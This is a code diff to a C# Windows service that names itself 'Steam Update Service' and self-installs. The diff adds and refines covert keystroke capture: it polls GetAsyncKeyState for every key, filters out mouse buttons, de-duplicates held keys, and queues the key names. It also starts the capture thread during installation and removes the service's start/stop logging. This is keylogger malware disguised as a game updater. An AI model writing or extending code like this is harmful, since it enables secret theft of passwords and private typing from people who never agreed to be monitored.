@@ -17,19 +17,20 @@ namespace WindowsService
     class WindowsService : ServiceBase
     {
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        static extern short GetAsyncKeyState(int vKey);
+        private static extern short GetAsyncKeyState(int vKey);
 
         [DllImport("user32.dll")]
-        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); 
+        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); 
 
 
         public static readonly string Name = "Steam Update Service";
         private static readonly log4net.ILog log = log4net.LogManager.GetLogger(typeof(WindowsService));
 
-        private Thread thread;
-        private static KeyHookManager keyhookMgr;
+        private static Thread thread;
         private static Queue keystrokeBuf;
         private static bool awaitingMsg;
+        private static bool calledUpdate;
+        private static Dictionary<Int32,short> prevVk;
 
         /// <summary>
         /// Public Constructor for WindowsService.
@@ -72,6 +73,13 @@ namespace WindowsService
                 {
                     ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
                 }
+
+                awaitingMsg = false;
+                prevVk = new Dictionary<Int32,short>();
+                keystrokeBuf = new Queue();
+
+                thread = new Thread(new ThreadStart(Update));
+                thread.Start();
             }
             else
             {
@@ -85,7 +93,6 @@ namespace WindowsService
             {
                 keystrokeBuf.Enqueue(msg);
             }
-            awaitingMsg = true;
         }
 
         private static void CheckKeys()
@@ -93,11 +100,29 @@ namespace WindowsService
             bool found = false;
             foreach (Int32 k in Enum.GetValues(typeof(Keys)))
             {
-                int state = GetAsyncKeyState(k);
+                short state = GetAsyncKeyState(k);
                 if (state == 1 || state == Int16.MinValue)
                 {
-                    PushMessage(Enum.GetName(typeof(Keys), k));
-                    found = true;
+                    if ((Keys)k != Keys.LButton && (Keys)k != Keys.RButton)
+                    {
+                        if (!prevVk.ContainsKey(k))
+                        {
+                            prevVk.Add(k, state);
+                        }
+                        if (prevVk[k] == 0)
+                        {
+                            PushMessage(Enum.GetName(typeof(Keys), k));
+                            found = true;
+                        }
+                    }
+                    
+                }
+                else
+                {
+                    if (!prevVk.ContainsKey(k))
+                        prevVk.Add(k, 0);
+                    else
+                        prevVk[k] = 0;
                 }
             }
 
@@ -132,7 +157,6 @@ namespace WindowsService
         ///    or not disposing is going on.</param>
         protected override void Dispose(bool disposing)
         {
-            keyhookMgr.Dispose();
             base.Dispose(disposing);
         }
 
@@ -143,14 +167,11 @@ namespace WindowsService
         /// <param name="args"></param>
         protected override void OnStart(string[] args)
         {
-            log.Info("Started service.");
+            //awaitingMsg = false;
+            //keystrokeBuf = new Queue();
 
-            awaitingMsg = false;
-            keystrokeBuf = new Queue();
-            keyhookMgr = new KeyHookManager(PushMessage);
-
-            thread = new Thread(new ThreadStart(Update));
-            thread.Start();
+            //thread = new Thread(new ThreadStart(Update));
+            //thread.Start();
 
             base.OnStart(args);
         }
@@ -161,10 +182,6 @@ namespace WindowsService
         /// </summary>
         protected override void OnStop()
         {
-            log.Info("Stopped service.");
-
-            thread.Join(50);
-
             base.OnStop();
         }
 
